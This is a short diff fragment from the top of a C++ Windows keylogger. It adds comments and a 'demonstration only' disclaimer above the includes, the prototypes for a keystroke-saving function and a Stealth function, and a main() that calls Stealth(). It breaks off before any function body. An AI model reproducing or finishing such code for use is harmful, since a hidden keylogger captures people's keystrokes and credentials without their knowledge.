@@ -1,13 +1,24 @@
+/*
+This is a simple keylogger program written in C++
+This is to be used ONLY for demonstration purposes, I am not responsible for any missuse of this script.
+PLEASE don't try to use this for nefarious purposes;
+*/
 
+//Libraries
 #include <iostream> 
 #include <windows.h> 
 #include <winuser.h>
- 
+
+//use standard namespace for c++ 
 using namespace std;
- 
+
+//Call keylogging function
 int Save (int key_stroke, char *file);
+//Call Display information in terminal
 void Stealth();
  
+
+ //The main program
 int main() {
     Stealth();
     char i;
